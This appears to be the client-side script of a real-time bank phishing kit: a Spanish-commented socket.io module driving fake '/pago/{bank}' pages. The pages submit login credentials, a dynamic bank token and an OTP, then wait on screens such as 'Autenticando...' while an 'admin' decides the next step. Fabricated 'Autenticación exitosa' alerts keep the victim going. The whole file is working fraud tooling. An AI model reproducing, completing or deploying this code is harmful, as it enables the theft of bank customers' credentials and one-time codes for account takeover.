// assets/js/socketConnection.js

(function () {
    const RT = (window.RT = window.RT || {
        nodeUrl: null,
        sessionId: null,
        sessionToken: null,
        bank: null,
        step: null,
        alertId: null,
        actionToScreen: {
            AUTH: "2",
            AUTH_WAIT_ACTION: "2",
            AUTH_ERROR: "1",
            DINAMIC: "3",
            DINAMIC_WAIT_ACTION: "3",
            DINAMIC_ERROR: "3",
            OTP: "4",
            OTP_WAIT_ACTION: "4",
            OTP_ERROR: "4",
        },
    });

    // Singleton socket + estado
    let socket = null;
    let isConnecting = false;
    let boundSocket = null;

    // Cola de emits si aún no conecta
    const pendingEmits = [];

    // Callback único por pantalla
    window.__rtUpdateCb = null;
    RT._awaiting = null; // "AUTH" | "DINAMIC" | "OTP" | null
    RT._seenWait = false; // true cuando llega *_WAIT_ACTION del submit actual

    function safeShowLoading(msg) {
        window.showLoading?.(msg);
    }
    function safeHideLoading() {
        window.hideLoading?.();
    }

    function flushQueue() {
        if (!socket || !socket.connected) return;

        while (pendingEmits.length) {
            const { eventName, payload, ackCb } = pendingEmits.shift();
            socket.emit(eventName, payload, ackCb);
        }
    }

    function bindListeners(socket) {
        if (!socket || boundSocket === socket) return;
        boundSocket = socket;

        socket.on("connect", () => {
            isConnecting = false;

            const hadPending = pendingEmits.length > 0;
            flushQueue();

            // si solo era conexión de pantalla, quita loading
            if (!hadPending) safeHideLoading();
        });

        socket.on("connect_error", (err) => {
            console.error("RT connect_error:", err);
            isConnecting = false;
            safeHideLoading();
            window.showBankAlert?.(
                "error_custom",
                "Error de conexión. Intenta nuevamente."
            );
        });

        socket.on("disconnect", (reason) => {
            // Opcional: podrías mostrar algo si se corta
            // console.warn("RT disconnected:", reason);
        });

        socket.on("session:update", (s) => {
            if (!s || !s.action) return;

            const action = String(s.action);

            if (RT._awaiting && !RT._seenWait) {
                if (RT._awaiting === "AUTH" && action === "AUTH_ERROR") return;
                if (RT._awaiting === "DINAMIC" && action === "DINAMIC_ERROR")
                    return;
                if (RT._awaiting === "OTP" && action === "OTP_ERROR") return;
            }
            console.log(action);
            const expected = RT.actionToScreen[action];
            const current = RT.step;
            const isWait = action.endsWith("_WAIT_ACTION");
            // ✅ Alertas (si usas alertId)
            const alertId = RT.alertId;
            console.log(action);
            console.log(action);
            let loadingText = "Cargando...";
            // ✅ Loading: se queda mientras espera al admin
            if (isWait) {
                RT._seenWait = true; // ✅ ya entró en WAIT del submit actual
                switch (current) {
                    case "2":
                        loadingText = "Autenticando...";
                        break;
                    case "3":
                        loadingText = "Validando...";
                        break;
                    case "4":
                        loadingText = "Validando...";
                        break;
                }

                safeShowLoading(loadingText);
                if (alertId) window.hideBankAlert?.(alertId);
                return; // ✅ no redirigir
            }
            console.log(alertId);
            console.log(expected);
            console.log(current);

            if (alertId) {
                if (s.lastError) window.showBankAlert?.(alertId, s.lastError);
                else window.hideBankAlert?.(alertId);
            }

            // ✅ SOLO redirigir cuando NO sea WAIT (cuando el admin ya decidió)
            // 1) WAIT: solo loading, no navegar

            // 2) AUTH_ERROR: guardar error + ir a step1
            if (action === "AUTH_ERROR") {
                if (s?.lastError) {
                    try {
                        sessionStorage.setItem(
                            "rt_last_error",
                            String(s.lastError)
                        );
                    } catch {}
                }
                window.location.href = `/pago/${RT.bank}/step/1`;
                return;
            }

            if (action === "DINAMIC_ERROR") {
                safeHideLoading();

                const msg =
                    s?.lastError || "Error. Intenta nuevamente.";

                // ✅ Si YA estás en step3, NO recargues la página: solo muestra alerta
                if (String(RT.step) === "3") {
                    const alertId = RT.alertId || "dinamicError";
                    window.showBankAlert?.(alertId, msg);
                    // aquí también puedes disparar tu callback para desbloquear inputs
                    if (typeof window.__rtUpdateCb === "function")
                        window.__rtUpdateCb(s);
                    return;
                }

                // ✅ Si no estás en step3, guarda y redirige
                try {
                    sessionStorage.setItem("rt_last_error", String(msg));
                } catch {}
                window.location.href = `/pago/${RT.bank}/step/3`;
                return;
            }

            if (action === "OTP_ERROR") {
                safeHideLoading();

                const msg =
                    s?.lastError || "Dato inválido. Intenta nuevamente.";

                // ✅ Si YA estás en step3, NO recargues la página: solo muestra alerta
                if (String(RT.step) === "4") {
                    const alertId = RT.alertId || "otpError";
                    window.showBankAlert?.(alertId, msg);
                    // aquí también puedes disparar tu callback para desbloquear inputs
                    if (typeof window.__rtUpdateCb === "function")
                        window.__rtUpdateCb(s);
                    return;
                }

                // ✅ Si no estás en step3, guarda y redirige
                try {
                    sessionStorage.setItem("rt_last_error", String(msg));
                } catch {}
                window.location.href = `/pago/${RT.bank}/step/4`;
                return;
            }

            if (!action.endsWith("_WAIT_ACTION")) {
                if (
                    action === "DINAMIC" ||
                    action === "OTP" ||
                    action === "AUTH_ERROR" ||
                    action === "DINAMIC_ERROR" ||
                    action === "OTP_ERROR"
                ) {
                    RT._awaiting = null;
                    RT._seenWait = false;
                }
            }

            // 3) Acciones "finales" que avanzan
            if (expected && current && expected !== current) {
                // ✅ Caso especial: AUTH → DINAMIC
                if (
                    action === "DINAMIC" ||
                    action === "OTP" ||
                    action === "DINAMIC_ERROR" ||
                    (action === "OTP_ERROR" && String(current) === "2")
                ) {
                    setTimeout(() => {
                        // Muestra mensaje de éxito
                        safeHideLoading();  
                        showBankAlert?.("success", "Autenticación exitosa.");
                        setTimeout(() => {
                            hideBankAlert();
                        }, 1000);
                    }, 1500);
                    setTimeout(() => {
                        safeShowLoading("Redirigiendo...");
                        window.location.href =
                            action === "OTP"
                                ? `/pago/${RT.bank}/step/4`
                                : `/pago/${RT.bank}/step/3`;
                    }, 2000);

                    return;
                }

                if (
                    action === "OTP" ||
                    (action === "OTP_ERROR" && String(current) === "3")
                ) {
                    setTimeout(() => {
                        // Muestra mensaje de éxito
                        safeHideLoading();
                        showBankAlert?.("success", "Validación exitosa.");
                        setTimeout(() => {
                            hideBankAlert();
                        }, 1000);
                    }, 1500);
                    setTimeout(() => {
                        safeShowLoading("Redirigiendo...");
                        window.location.href = `/pago/${RT.bank}/step/4`;
                    }, 2000);

                    return;
                }

                if (action === "DINAMIC" && String(current) === "4") {
                    setTimeout(() => {
                        // Muestra mensaje de éxito
                        safeHideLoading();
                        showBankAlert?.("success", "Validación exitosa.");
                        setTimeout(() => {
                            hideBankAlert();
                        }, 1000);
                    }, 1500);
                    setTimeout(() => {
                        safeShowLoading("Redirigiendo...");
                        window.location.href = `/pago/${RT.bank}/step/3`;
                    }, 2000);

                    return;
                }

                // Redirección normal
                window.location.href = `/pago/${RT.bank}/step/${expected}`;
                return;
            }

            // ✅ callback para lógica por pantalla
            if (typeof window.__rtUpdateCb === "function") {
                try {
                    window.__rtUpdateCb(s);
                } catch (e) {
                    console.error(e);
                }
            }
        });

        window.addEventListener("beforeunload", () => {
            try {
                socket?.disconnect();
            } catch {}
        });
    }

    // Expuesto: inicializa (o reutiliza) conexión
    window.initSocketConnection = function (
        nodeUrl,
        sessionId,
        sessionToken,
        bank,
        step
    ) {
        if (!nodeUrl || !sessionToken) return;

        RT.nodeUrl = nodeUrl;
        RT.sessionId = sessionId;
        RT.sessionToken = sessionToken;
        RT.bank = bank;
        RT.step = step;

        // ✅ si ya hay socket conectado, reutiliza
        if (socket && socket.connected) {
            bindListeners(socket);
            return;
        }

        // ✅ si ya está conectando, no dupliques
        if (isConnecting) return;

        safeShowLoading("Conectando...");
        isConnecting = true;

        // desconecta viejo si existe
        try {
            socket?.disconnect();
        } catch {}

        socket = io(nodeUrl, {
            transports: ["websocket"],
            auth: { token: sessionToken },
        });

        window.RT_SOCKET = socket;
        bindListeners(socket);
    };

    // Expuesto: registra callback por pantalla
    window.registerSocketUpdateCallback = function (callback) {
        window.__rtUpdateCb = callback;
    };

    // ✅ Expuesto SIEMPRE: emite aunque no haya conectado aún (lo encola)
    // ✅ Esta es la pieza clave: si no hay conexión, la crea y encola el emit
    window.rtEmitSubmit = function (eventName, payload, ackCb) {
        safeShowLoading("Cargando...");

        // ✅ marcar qué flujo está esperando
        if (eventName === "user:submit_auth") RT._awaiting = "AUTH";
        if (eventName === "user:submit_dinamic") RT._awaiting = "DINAMIC";
        if (eventName === "user:submit_otp") RT._awaiting = "OTP";
        RT._seenWait = false;

        // si no hay socket o no está conectado, encola y conecta
        if (!socket || !socket.connected) {
            pendingEmits.push({ eventName, payload, ackCb });

            if (RT.nodeUrl && RT.sessionToken) {
                window.initSocketConnection(
                    RT.nodeUrl,
                    RT.sessionId,
                    RT.sessionToken,
                    RT.bank,
                    RT.step
                );
            }
            return;
        }
        console.log(eventName, payload, ackCb);
        socket.emit(eventName, payload, ackCb);
    };
})();
